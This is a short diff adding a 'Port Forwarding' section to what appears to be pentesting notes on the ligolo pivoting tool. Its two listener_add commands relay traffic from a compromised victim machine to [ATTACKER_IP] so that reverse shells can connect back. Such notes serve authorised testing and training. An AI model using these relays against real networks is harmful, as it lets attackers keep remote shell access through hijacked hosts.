@@ -41,3 +41,14 @@ If cert issues:
 ```
 -ignore-cert
 ```
+# Port Forwarding
+If revshells or tools need to connect back to the attacker device, a port forward is required...
+
+On ligolo:
+```
+listener_add --addr 0.0.0.0:1234 --to [ATTACKER_IP]:4444
+```
+```
+listener_add --addr 0.0.0.0:1235 --to [ATTACKER_IP]:80
+```
+The following two commands forward any traffic that goes to ligolo victim machine at ports 1234 and 1235 onto the attacker machine at ports 4444 and 80 respectively.
